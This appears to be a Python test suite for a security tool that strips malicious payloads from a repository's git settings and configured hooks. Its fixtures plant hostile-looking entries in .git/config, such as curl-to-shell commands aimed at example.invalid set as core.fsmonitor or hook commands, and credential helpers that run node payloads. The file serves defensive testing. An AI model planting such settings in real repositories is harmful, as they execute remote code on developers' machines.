#!/usr/bin/env python3
"""What `saw fix` takes out of a checkout's git settings and configured hooks.

A setting is taken out when its own value carries a known payload, as that one value; a configured
hook when every entry of it is in the checkout and every command it names carries one, as its whole
definition. No file is removed here. Everything else confirmed is left and named, and while a
confirmed configured hook is left, the checkout pass makes no change of its own through git.
"""
from __future__ import annotations

import os
import re
import stat
import subprocess
import unittest
from unittest import mock

from stayawake.bots.security.models import REMEDIATION_VERBS
from stayawake.bots.security.pr.fix_verdict import (
    BaseFix, BaseState, FixVerdict, checkout_of, render_fix_verdict)
from stayawake.bots.security.remediation import git_settings, live
from stayawake.bots.security.scanner import scan_target
from stayawake.bots.security.signatures import load_signatures
from stayawake.bots.security.targets import LocalRepoTarget
from stayawake.bots.security.targets.base import ScanOptions
from stayawake.lib.git import operator_config
from tests.support.gitrepo import GitSandbox

PAYLOAD = "global['_V']='8-12';"
PAYLOAD_FILE = "#!/usr/bin/env node\n" + PAYLOAD + "\n"


def _git_runs_configured_hooks() -> bool:
    version = subprocess.run(["git", "--version"], capture_output=True, text=True).stdout
    found = re.search(r"(\d+)\.(\d+)", version)
    return bool(found) and (int(found.group(1)), int(found.group(2))) >= (2, 54)


def _said(result) -> str:
    state, found = checkout_of(result)
    return render_fix_verdict(FixVerdict("p", BaseFix(BaseState.PREPARED, "p", "main"), state,
                                         checkout_detail=found), True)


class _GitSettingsCheckout(GitSandbox):

    def setUp(self):
        super().setUp()
        self.root = self.new_repo("project")
        self.write(self.root, "src/index.js", "export const greet = (n) => n;\n")
        self.commit(self.root, "a starting point")

    def configure(self, text: str, rel: str = ".git/config") -> None:
        with open(self.root / rel, "a", encoding="utf-8") as fh:
            fh.write(text)

    def config_bytes(self) -> bytes:
        return (self.root / ".git" / "config").read_bytes()

    def settings(self) -> list[str]:
        return self.git(self.root, "config", "--file", ".git/config", "--list").splitlines()

    def values(self, key: str) -> list[str]:
        res = self.git_may_fail(self.root, "config", "--file", ".git/config", "--get-all", key)
        return res.stdout.splitlines()

    def git_works(self) -> bool:
        return self.git_may_fail(self.root, "update-ref", "refs/heads/probe", "HEAD").returncode == 0

    def checkout(self, allowlist=None):
        def scan(*_a, **_k):
            return scan_target(LocalRepoTarget(self.root, "p", ScanOptions()), load_signatures(),
                               allowlist or [])
        return live.clean_checkout(self.root, ScanOptions(), load_signatures(), allowlist or [],
                                   scan=scan)

    def reported_evidence(self, rel: str) -> list[str]:
        return [f.evidence for f in scan_target(
            LocalRepoTarget(self.root, "p", ScanOptions()), load_signatures(), []).findings
            if f.signature_id == "git-exec-payload" and f.path == rel]

    def payload_hook(self, name: str = "sync", events=("pre-commit",)) -> str:
        lines = "".join(f"\tevent = {e}\n" for e in events)
        return f'[hook "{name}"]\n\tcommand = node -e "{PAYLOAD}"\n{lines}'


class TestAHookCarryingAPayloadGoesWhole(_GitSettingsCheckout):

    def setUp(self):
        super().setUp()
        self.configure(self.payload_hook(events=("post-checkout", "reference-transaction"))
                       + '[hook "fmt"]\n\tcommand = true\n\tevent = pre-commit\n')

    def test_every_part_of_its_definition_is_gone(self):
        result = self.checkout()
        self.assertTrue(result.infected, "the fixture must carry a confirmed finding")
        self.assertEqual([], [s for s in self.settings() if s.startswith("hook.sync.")])
        self.assertIn(".git/config", result.removed.stripped)

    def test_another_hook_and_every_other_setting_stay(self):
        before = [s for s in self.settings() if not s.startswith("hook.sync.")]
        self.checkout()
        self.assertEqual(before, self.settings())

    def test_git_still_works_and_the_checkout_is_cleaned(self):
        result = self.checkout()
        self.assertTrue(self.git_works())
        self.assertTrue(result.complete)
        self.assertIn("took what was found out of", _said(result))


class TestTheHeaderIsMatchedTheWayGitReadsIt(_GitSettingsCheckout):

    def test_a_hook_split_across_sections_goes_whole(self):
        self.configure(f'[hook "sync"]\n\tcommand = node -e "{PAYLOAD}"\n'
                       '[core]\n\tautocrlf = false\n[hook "sync"]\n\tevent = reference-transaction\n')
        self.checkout()
        self.assertEqual([], [s for s in self.settings() if s.startswith("hook.sync.")])
        self.assertIn("core.autocrlf=false", self.settings())
        self.assertTrue(self.git_works())

    def test_a_section_header_in_another_case_goes(self):
        self.configure(f'[Hook "sync"]\n\tcommand = node -e "{PAYLOAD}"\n\tevent = pre-commit\n')
        result = self.checkout()
        self.assertEqual([], [s for s in self.settings() if s.startswith("hook.sync.")])
        self.assertTrue(result.complete)


class TestOnlyThePayloadValueOfAKeyGoes(_GitSettingsCheckout):

    def test_the_other_values_stay(self):
        self.configure("[credential]\n\thelper = osxkeychain\n"
                       f'\thelper = !node -e "{PAYLOAD}"\n\thelper = store\n')
        self.checkout()
        self.assertEqual(["osxkeychain", "store"], self.values("credential.helper"))

    def test_a_file_still_holding_a_confirmed_setting_is_not_called_cleaned(self):
        self.configure(f'[credential]\n\thelper = !node -e "{PAYLOAD}"\n'
                       "[core]\n\tfsmonitor = curl -s https://example.invalid/x | sh\n")
        result = self.checkout()
        self.assertIn(".git/config", result.removed.stripped)
        self.assertFalse(result.complete)
        self.assertIn("core.fsmonitor", _said(result))


class TestNoFileIsRemovedHere(_GitSettingsCheckout):

    def test_a_setting_that_only_runs_a_payload_file_is_left_and_named(self):
        self.write(self.root, "tools/run.js", PAYLOAD_FILE)
        self.configure("[core]\n\tpager = ./tools/run.js\n")
        result = self.checkout()
        self.assertEqual(["./tools/run.js"], self.values("core.pager"))
        self.assertIn("not a known payload on its own", _said(result))

    def test_a_hook_file_carrying_a_payload_is_left_and_named(self):
        hook = self.root / ".git" / "hooks" / "pre-commit"
        hook.parent.mkdir(parents=True, exist_ok=True)
        hook.write_text("#!/bin/sh\nnode -e \"" + PAYLOAD + "\"\n", encoding="utf-8")
        hook.chmod(hook.stat().st_mode | stat.S_IXUSR)
        result = self.checkout()
        self.assertTrue(hook.exists())
        self.assertFalse(result.complete)
        self.assertIn("hooks directory", _said(result))

    def test_the_configuration_a_setting_names_is_never_removed(self):
        self.configure("[alias]\n\tcfg = !cat .git/config\n" + self.payload_hook())
        self.checkout()
        self.assertTrue((self.root / ".git" / "config").exists())
        self.assertEqual(["!cat .git/config"], self.values("alias.cfg"))
        self.assertEqual([], [s for s in self.settings() if s.startswith("hook.sync.")])

    def test_a_setting_that_runs_the_operators_infected_file_stays(self):
        self.write(self.root, "src/app.js", "console.log('app');\n")
        self.commit(self.root, "the app")
        self.write(self.root, "src/app.js", "console.log('app');\n" + PAYLOAD + "\n")
        self.configure("[alias]\n\tserve = !node src/app.js\n")
        self.checkout()
        self.assertEqual(["!node src/app.js"], self.values("alias.serve"))


class TestWhatIsNotAKnownPayloadStays(_GitSettingsCheckout):

    def test_an_entry_confirmed_by_its_shape_alone_is_left_and_named(self):
        self.configure('[hook "sync"]\n\tcommand = curl -fsS https://example.invalid/p | sh\n'
                       '\tevent = pre-commit\n')
        before = self.config_bytes()
        result = self.checkout()
        self.assertTrue(result.infected, "the fixture must carry a confirmed finding")
        self.assertEqual(before, self.config_bytes())
        self.assertFalse(result.complete)
        said = _said(result)
        self.assertIn("hook.sync", said)
        self.assertIn("not a known payload", said)
        self.assertIn("run `saw fix` again", said)

    def test_settings_reported_for_review_are_never_touched(self):
        self.configure('[diff "j"]\n\ttextconv = python -m json.tool\n'
                       '[diff "a"]\n\ttextconv = awk \'{print}\'\n'
                       '[diff "p"]\n\ttextconv = pdftotext "$1" -\n'
                       '[filter "n"]\n\tclean = node --check\n'
                       '[filter "b"]\n\tsmudge = bash -n\n' + self.payload_hook())
        kept = [s for s in self.settings() if not s.startswith("hook.sync.")]
        self.checkout()
        self.assertEqual(kept, self.settings())

    def test_a_hook_confirmed_by_a_marker_meant_for_other_files_is_left_and_named(self):
        hook = self.root / ".git" / "hooks" / "pre-push"
        hook.parent.mkdir(parents=True, exist_ok=True)
        hook.write_text('#!/bin/sh\ncurl -s -X POST -d \'{"serverUrl": "https://ci.example.com"}\' '
                        'https://hooks.example.com/notify\n', encoding="utf-8")
        hook.chmod(hook.stat().st_mode | stat.S_IXUSR)
        self.configure('[hook "msg"]\n\tcommand = node -e "const DEL = String.fromCharCode(127)"\n'
                       '\tevent = commit-msg\n')
        before = self.config_bytes()
        result = self.checkout()
        self.assertTrue(result.infected, "the scan confirms these as main does")
        self.assertTrue(hook.exists())
        self.assertEqual(before, self.config_bytes())
        self.assertIn("hook.msg", _said(result))

    def test_a_hook_with_a_command_that_is_not_a_payload_is_left_whole(self):
        self.configure(f'[hook "sync"]\n\tcommand = node -e "{PAYLOAD}"\n'
                       '\tcommand = curl -fsS https://example.invalid/p | sh\n\tevent = pre-commit\n')
        before = self.config_bytes()
        result = self.checkout()
        self.assertEqual(before, self.config_bytes())
        self.assertEqual(1, _said(result).count("hook.sync"))

    def test_an_accepted_hook_of_the_same_name_keeps_the_whole_hook(self):
        self.configure(self.payload_hook())
        self.configure(f'[hook "sync"]\n\tcommand = node -e "{PAYLOAD} 2"\n', rel=".git/team.inc")
        self.configure("[include]\n\tpath = team.inc\n")
        rule = {"signature": "git-exec-payload", "path_glob": ".git/team.inc",
                "evidence": self.reported_evidence(".git/team.inc")[0]}
        inside, included = self.config_bytes(), (self.root / ".git" / "team.inc").read_bytes()
        self.checkout(allowlist=[rule])
        self.assertEqual(inside, self.config_bytes())
        self.assertEqual(included, (self.root / ".git" / "team.inc").read_bytes())

    def test_an_accepted_payload_setting_stays_beside_one_taken_out(self):
        self.configure(f'[credential]\n\thelper = !node -e "{PAYLOAD}"\n')
        rule = {"signature": "git-exec-payload", "path_glob": ".git/config",
                "evidence": self.reported_evidence(".git/config")[0]}
        self.configure(f'[core]\n\tpager = node -e "{PAYLOAD}"\n')
        self.checkout(allowlist=[rule])
        self.assertEqual([f"!node -e {PAYLOAD}"], self.values("credential.helper"))
        self.assertEqual([], self.values("core.pager"))

    def test_another_worktrees_hook_of_the_same_name_keeps_the_whole_hook(self):
        self.git(self.root, "config", "extensions.worktreeConfig", "true")
        self.git(self.root, "worktree", "add", "-q", str(self.root.parent / "other"))
        self.configure(self.payload_hook())
        (self.root / ".git" / "worktrees" / "other" / "config.worktree").write_text(
            '[hook "sync"]\n\tcommand = npx lint-staged\n', encoding="utf-8")
        before = self.config_bytes()
        result = self.checkout()
        self.assertEqual(before, self.config_bytes())
        self.assertIn("hook.sync", _said(result))


class TestNothingOutsideTheCheckoutIsEdited(_GitSettingsCheckout):

    def setUp(self):
        super().setUp()
        self.outside = self.root.parent / "shared.cfg"

    def test_a_payload_setting_in_an_outside_include_is_left_and_named(self):
        self.outside.write_text(self.payload_hook(), encoding="utf-8")
        self.configure(f"[include]\n\tpath = {self.outside}\n")
        before = self.outside.read_bytes()
        result = self.checkout()
        self.assertEqual(before, self.outside.read_bytes())
        self.assertFalse(result.complete)
        self.assertIn("outside your checkout", _said(result))

    def test_a_payload_value_in_an_outside_include_is_left_and_named(self):
        self.outside.write_text(f'[credential]\n\thelper = !node -e "{PAYLOAD}"\n', encoding="utf-8")
        self.configure(f"[include]\n\tpath = {self.outside}\n")
        before = self.outside.read_bytes()
        result = self.checkout()
        self.assertEqual(before, self.outside.read_bytes())
        self.assertFalse(result.complete)
        self.assertIn("outside your checkout", _said(result))

    def test_a_hook_partly_set_outside_is_left_whole_and_the_outside_file_named(self):
        self.outside.write_text('[hook "sync"]\n\tevent = pre-commit\n', encoding="utf-8")
        self.configure(f'[hook "sync"]\n\tcommand = node -e "{PAYLOAD}"\n'
                       f"[include]\n\tpath = {self.outside}\n")
        before = self.config_bytes()
        result = self.checkout()
        self.assertEqual(before, self.config_bytes())
        self.assertFalse(result.complete)
        self.assertIn("shared.cfg", _said(result))

    def test_a_hook_whose_events_the_operator_sets_globally_is_left_and_git_still_works(self):
        mine = self.root.parent / "operator.gitconfig"
        mine.write_text('[hook "sync"]\n\tevent = pre-push\n', encoding="utf-8")
        self.configure(f'[hook "sync"]\n\tcommand = node -e "{PAYLOAD}"\n')
        before = self.config_bytes()
        with mock.patch.dict(os.environ, {"GIT_CONFIG_GLOBAL": str(mine)}):
            result = self.checkout()
            self.assertEqual(before, self.config_bytes())
            self.assertFalse(result.complete)
            self.assertTrue(self.git_works())


class TestWhileAConfirmedHookIsLeftTheCheckoutPassHoldsBack(_GitSettingsCheckout):

    def setUp(self):
        super().setUp()
        self.outside = self.root.parent / "shared.cfg"
        self.outside.write_text('[hook "sync"]\n\tevent = post-index-change\n'
                                '\tevent = reference-transaction\n', encoding="utf-8")
        self.marker = self.root.parent / "RAN"
        self.write(self.root, "src/evil.js", PAYLOAD_FILE)
        self.git(self.root, "add", "src/evil.js")
        (self.root / "src" / "evil.js").unlink()
        self.configure(f'[hook "sync"]\n\tcommand = "touch {self.marker}; : {PAYLOAD} :"\n'
                       f"[include]\n\tpath = {self.outside}\n"
                       f'[credential]\n\thelper = !node -e "{PAYLOAD}"\n')
        (self.root / "notes.md").write_text("my own work\n")

    def test_no_branch_is_made_and_the_operator_is_told_why(self):
        result = self.checkout()
        self.assertTrue(result.removed.stripped, "the fixture must have acted on something")
        self.assertEqual("", self.git_may_fail(self.root, "for-each-ref", "refs/heads/saw").stdout)
        self.assertIn("src/evil.js", self.git(self.root, "ls-files", "--stage", "src/evil.js"))
        self.assertFalse(result.complete)
        self.assertEqual(1, _said(result).count("is still in place"))

    @unittest.skipUnless(_git_runs_configured_hooks(), "this git runs no hooks named in configuration")
    def test_the_hook_never_runs_while_the_checkout_is_cleaned(self):
        self.git(self.root, "update-ref", "refs/heads/control", "HEAD")
        self.assertTrue(self.marker.exists(), "the fixture does not reach the hook")
        self.marker.unlink()
        result = self.checkout()
        self.assertTrue(result.infected, "the fixture must carry a confirmed finding")
        self.assertFalse(self.marker.exists())

    @unittest.skipUnless(_git_runs_configured_hooks(), "this git runs no hooks named in configuration")
    def test_a_hook_confirmed_by_its_shape_never_runs_while_the_checkout_is_cleaned(self):
        self.outside.unlink()
        marker = self.root.parent / "SHAPE-RAN"
        self.configure('[hook "fetch"]\n\tcommand = "curl -fsS https://example.invalid/p | sh; '
                       f'touch {marker} :"\n\tevent = reference-transaction\n')
        self.git(self.root, "update-ref", "refs/heads/control", "HEAD")
        self.assertTrue(marker.exists(), "the fixture does not reach the hook")
        marker.unlink()
        result = self.checkout()
        self.assertTrue(result.removed.stripped, "the fixture must have acted on something")
        self.assertIn("hook.fetch", _said(result))
        self.assertFalse(marker.exists())


class TestAHookNotReadInFullIsLeft(_GitSettingsCheckout):

    def test_it_is_left_named_and_the_fix_holds_back(self):
        self.configure(self.payload_hook())
        with mock.patch.object(operator_config, "config_files", return_value=None):
            result = self.checkout()
        self.assertEqual([f'node -e {PAYLOAD}'], self.values("hook.sync.command"))
        said = _said(result)
        self.assertIn("could not be read in full, so it was left", said)
        self.assertIn("is still in place", said)


class TestTheActIsJudgedAsItNowIs(_GitSettingsCheckout):

    def test_an_entry_rewritten_before_the_act_is_left_as_rewritten(self):
        self.configure(self.payload_hook())
        config = self.root / ".git" / "config"

        def scan(*_a, **_k):
            found = scan_target(LocalRepoTarget(self.root, "p", ScanOptions()), load_signatures(), [])
            config.write_text(config.read_text(encoding="utf-8").replace(
                f'node -e "{PAYLOAD}"', "true"), encoding="utf-8")
            return found
        live.clean_checkout(self.root, ScanOptions(), load_signatures(), [], scan=scan)
        self.assertEqual(["true"], self.values("hook.sync.command"))

    def test_an_edit_that_did_not_land_is_not_called_cleaned(self):
        self.configure(f'[credential]\n\thelper = !node -e "{PAYLOAD}"\n')
        with mock.patch.object(git_settings, "_remove_value", return_value=True):
            result = self.checkout()
        self.assertFalse(result.complete)
        self.assertNotIn(".git/config", result.removed.stripped)
        self.assertIn("could not be taken out", _said(result))

    def test_a_hook_edit_that_did_not_land_is_not_called_cleaned(self):
        self.configure(self.payload_hook())
        with mock.patch.object(git_settings, "_remove_key", return_value=True):
            result = self.checkout()
        self.assertEqual([f'node -e {PAYLOAD}'], self.values("hook.sync.command"))
        self.assertFalse(result.complete)
        self.assertNotIn(".git/config", result.removed.stripped)
        self.assertIn("could not be taken out", _said(result))


@unittest.skipUnless(_git_runs_configured_hooks(), "this git runs no hooks named in configuration")
class TestNoPayloadHookRunsWhileTheCheckoutIsCleaned(_GitSettingsCheckout):

    def test_it_is_taken_out_before_the_checkout_pass_writes_anything(self):
        marker = self.root.parent / "RAN"
        self.configure(f'[hook "sync"]\n\tcommand = "touch {marker}; : {PAYLOAD} :"\n'
                       '\tevent = post-index-change\n\tevent = reference-transaction\n')
        (self.root / "notes.md").write_text("my own work\n")
        self.git(self.root, "update-ref", "refs/heads/control", "HEAD")
        self.assertTrue(marker.exists(), "the fixture does not reach the hook")
        marker.unlink()
        result = self.checkout()
        self.assertTrue(result.infected, "the fixture must carry a confirmed finding")
        self.assertEqual([], [s for s in self.settings() if s.startswith("hook.sync.")])
        self.assertFalse(marker.exists())


class TestGitKeepsWorkingInEveryRepositoryAndWorktree(_GitSettingsCheckout):

    def test_a_hook_whose_event_cannot_be_taken_out_keeps_its_command(self):
        self.git(self.root, "config", "extensions.worktreeConfig", "true")
        other = self.root.parent / "other"
        self.git(self.root, "worktree", "add", "-q", str(other))
        self.configure(self.payload_hook())
        own = self.root / ".git" / "worktrees" / "other" / "config.worktree"
        own.write_text('[hook "sync"]\n\tevent = post-checkout\n', encoding="utf-8")
        (own.parent / "config.worktree.lock").write_text("", encoding="utf-8")
        result = self.checkout()
        self.assertEqual([f"node -e {PAYLOAD}"], self.values("hook.sync.command"))
        status = subprocess.run(["git", "-C", str(other), "status"], capture_output=True)
        self.assertEqual(0, status.returncode, status.stderr)
        self.assertFalse(result.complete)
        self.assertIn("could not be taken out", _said(result))

    def test_a_hook_named_after_an_event_is_left_with_the_operators_switch(self):
        self.configure('[hook "pre-push"]\n\tenabled = false\n')
        self.configure(f'[hook "pre-push"]\n\tcommand = node -e "{PAYLOAD}"\n\tevent = pre-commit\n')
        before = self.config_bytes()
        result = self.checkout()
        self.assertTrue(result.infected, "the fixture must carry a confirmed finding")
        self.assertEqual(before, self.config_bytes())
        self.assertIn("named after a hook event", _said(result))

    def test_a_submodules_hook_of_the_same_name_is_never_changed(self):
        library = self.new_repo("library")
        self.write(library, "lib.js", "export const x = 1;\n")
        self.commit(library, "a library")
        self.git(self.root, "-c", "protocol.file.allow=always", "submodule", "add", "-q", str(library),
                 "sub")
        self.git(self.root / "sub", "config", "extensions.worktreeConfig", "true")
        module = self.root / ".git" / "modules" / "sub"
        with open(module / "config", "a", encoding="utf-8") as fh:
            fh.write('[hook "lint"]\n\tevent = pre-commit\n' + self.payload_hook("fetch"))
        (module / "config.worktree").write_text('[hook "lint"]\n\tcommand = npx eslint .\n',
                                                encoding="utf-8")
        self.configure(self.payload_hook("lint"))
        before = (module / "config").read_bytes()
        result = self.checkout()
        self.assertEqual(before, (module / "config").read_bytes())
        self.assertEqual([], [s for s in self.settings() if s.startswith("hook.lint.")])
        self.assertIn("hook.fetch in .git/modules/sub/config is in a submodule's settings", _said(result))


class TestEverySettingIsReadAsGitReadsIt(_GitSettingsCheckout):

    def test_a_definition_behind_a_link_and_dotdot_is_taken_out_too(self):
        inner = self.root / ".git" / "deep" / "inner"
        inner.mkdir(parents=True)
        (self.root / ".git" / "lnk").symlink_to(inner)
        (self.root / ".git" / "deep" / "extra.inc").write_text(
            self.payload_hook(events=("post-checkout",)), encoding="utf-8")
        self.configure(self.payload_hook() + "[include]\n\tpath = lnk/../extra.inc\n")
        result = self.checkout()
        listed = self.git_may_fail(self.root, "config", "--get-regexp", r"^hook\.sync\.").stdout
        self.assertEqual("", listed)
        self.assertTrue(result.complete)

    def test_a_setting_read_twice_is_named_once(self):
        (self.root / ".git" / "team.inc").write_text(
            "[core]\n\tfsmonitor = curl -s https://example.invalid/x | sh\n", encoding="utf-8")
        self.configure("[include]\n\tpath = team.inc\n[include]\n\tpath = team.inc\n")
        result = self.checkout()
        self.assertEqual(1, _said(result).count("core.fsmonitor"))


class TestOnlyWhatGitReadsForThisRepositoryIsEdited(_GitSettingsCheckout):

    def test_a_hooks_file_a_submodule_also_reads_is_left_and_git_still_works_there(self):
        library = self.new_repo("library")
        self.write(library, "lib.js", "export const x = 1;\n")
        self.commit(library, "a library")
        self.git(self.root, "-c", "protocol.file.allow=always", "submodule", "add", "-q", str(library),
                 "sub")
        (self.root / "hooks.cfg").write_text(self.payload_hook(), encoding="utf-8")
        self.configure("[include]\n\tpath = ../hooks.cfg\n")
        with open(self.root / ".git" / "modules" / "sub" / "config", "a", encoding="utf-8") as fh:
            fh.write('[include]\n\tpath = ../../../hooks.cfg\n[hook "sync"]\n\tevent = post-checkout\n')
        before = (self.root / "hooks.cfg").read_bytes()
        result = self.checkout()
        self.assertEqual(before, (self.root / "hooks.cfg").read_bytes())
        self.assertIn("submodule", _said(result))
        status = subprocess.run(["git", "-C", str(self.root / "sub"), "status"], capture_output=True)
        self.assertEqual(0, status.returncode, status.stderr)

    def test_a_file_git_cannot_open_is_never_edited(self):
        phantom = self.root / ".git" / "phantom.cfg"
        phantom.write_text('[hook "sync"]\n\tevent = post-checkout\n', encoding="utf-8")
        self.configure(self.payload_hook() + "[include]\n\tpath = gone/../phantom.cfg\n")
        before = phantom.read_bytes()
        self.checkout()
        self.assertEqual(before, phantom.read_bytes())
        self.assertEqual([], [s for s in self.settings() if s.startswith("hook.sync.")])


class TestAFilterGitRequiresKeepsItsCommands(_GitSettingsCheckout):

    def test_its_payload_commands_are_left_and_named(self):
        self.configure(f'[filter "x"]\n\tclean = node -e "{PAYLOAD}"\n\tsmudge = node -e "{PAYLOAD}"\n'
                       "\trequired = true\n")
        result = self.checkout()
        self.assertEqual([f"node -e {PAYLOAD}"], self.values("filter.x.clean"))
        self.assertIn("filter git requires", _said(result))


class TestTheVerbIsDeclaredAsData(unittest.TestCase):

    def test_the_signature_names_the_verb_the_fix_carries_out(self):
        by_id = {s["id"]: s for group in load_signatures().values() for s in group}
        self.assertEqual("remove-git-exec-payload", by_id["git-exec-payload"]["remediation"])
        self.assertIn("remove-git-exec-payload", REMEDIATION_VERBS)


if __name__ == "__main__":
    unittest.main()
